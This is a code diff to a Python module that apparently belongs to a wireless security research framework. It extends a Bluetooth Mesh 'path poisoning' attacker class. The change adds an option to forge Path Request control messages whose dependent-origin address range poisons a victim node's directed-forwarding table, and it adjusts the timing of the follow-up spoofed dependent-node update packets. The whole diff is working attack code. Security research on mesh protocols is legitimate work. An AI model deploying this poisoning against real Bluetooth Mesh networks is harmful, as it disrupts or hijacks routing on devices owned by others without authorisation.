@@ -18,6 +18,7 @@ from whad.btmesh.stack.constants import DIRECTED_FORWARDING_CREDS
 
 from time import sleep
 from random import uniform
+from threading import Event
 from copy import copy
 
 logger = logging.getLogger(__name__)
@@ -32,6 +33,7 @@ class PathPoisonBidirConfiguration:
     :param forwarding_number: The forwading_number to use for the path. If None, local node's forwading_number used (increment auto).
     :param low_address_range: The low bound for the range of addresses to add the the dependent nodes.
     :param high_address_range: The high bound for the range of addresses to add the the dependent nodes.
+    :param use_path_req_dep_nodes: If set to 1, uses the Path Request message itself to poison the table by adding dependent nodes directly in it.
     :param net_key_index: The net_key_index to use to send the control messages.
     """
 
@@ -40,6 +42,7 @@ class PathPoisonBidirConfiguration:
     forwarding_number: int | None = 0
     low_address_range: int = 0x0001
     high_address_range: int = 0x010F
+    use_path_req_dep_nodes: int = 0
     net_key_index: int = 0
 
 
@@ -113,18 +116,44 @@ class PathPoisonBidirAttacker(Attacker):
         else:
             forwarding_number = self._configuration.forwarding_number
 
-        pkt = BTMesh_Upper_Transport_Control_Path_Request(
-            on_behalf_of_dependent_origin=0,
-            path_origin_path_metric_type=0,
-            path_discovery_interval=0,
-            path_origin_path_lifetime=2,
-            path_origin_path_metric=0,
-            path_origin_forwarding_number=forwarding_number,
-            destination=self._configuration.victim & 0xFFFF,
-            path_origin_unicast_addr_range=UnicastAddr(
-                range_start=self._configuration.path_origin & 0x7FFF
-            ),
-        )
+        # if we do not use the dependent nodes fields in the path request
+        if self._configuration.use_path_req_dep_nodes == 0:
+            pkt = BTMesh_Upper_Transport_Control_Path_Request(
+                on_behalf_of_dependent_origin=0,
+                path_origin_path_metric_type=0,
+                path_discovery_interval=0,
+                path_origin_path_lifetime=2,
+                path_origin_path_metric=0,
+                path_origin_forwarding_number=forwarding_number,
+                destination=self._configuration.victim & 0xFFFF,
+                path_origin_unicast_addr_range=UnicastAddr(
+                    range_start=self._configuration.path_origin & 0x7FFF
+                ),
+            )
+        else:
+            pkt = BTMesh_Upper_Transport_Control_Path_Request(
+                on_behalf_of_dependent_origin=1,
+                path_origin_path_metric_type=0,
+                path_discovery_interval=0,
+                path_origin_path_lifetime=2,
+                path_origin_path_metric=0,
+                path_origin_forwarding_number=forwarding_number,
+                destination=self._configuration.victim & 0xFFFF,
+                path_origin_unicast_addr_range=UnicastAddr(
+                    range_start=self._configuration.path_origin & 0x7FFF,
+                ),
+                dependent_origin_unicast_addr_range=UnicastAddr(
+                    length_present=1,
+                    range_start=(self._configuration.low_address_range & 0x7FFF),
+                    range_length=(
+                        255
+                        if self._configuration.high_address_range <= 0x7FFF
+                        else max(
+                            1, min(0x7FFF - self._configuration.high_address_range, 255)
+                        )
+                    ),
+                ),
+            )
 
         ctx = MeshMessageContext()
         ctx.creds = DIRECTED_FORWARDING_CREDS
@@ -191,7 +220,6 @@ class PathPoisonBidirAttacker(Attacker):
             resp_ctx.net_key_id = self._configuration.net_key_index
             sleep(0.2)
 
-            
             upper_transport = self._connector.main_stack.get_layer("upper_transport")
             upper_transport.send_control_message((resp_pkt, resp_ctx))
 
@@ -204,8 +232,12 @@ class PathPoisonBidirAttacker(Attacker):
             """
 
             dep_pkts = self._get_dependent_node_update_packets()
+            # if we uses first packet Path Request to poison, drop one dependent nodes update message
+            if self._configuration.use_path_req_dep_nodes == 1 and len(dep_pkts) > 0:
+                dep_pkts = dep_pkts[1:]
+
             for dep_pkt in dep_pkts:
-                sleep(0.2)
+                sleep(0.3)
                 dep_ctx = copy(resp_ctx)
                 upper_transport.send_control_message((dep_pkt, dep_ctx))
 
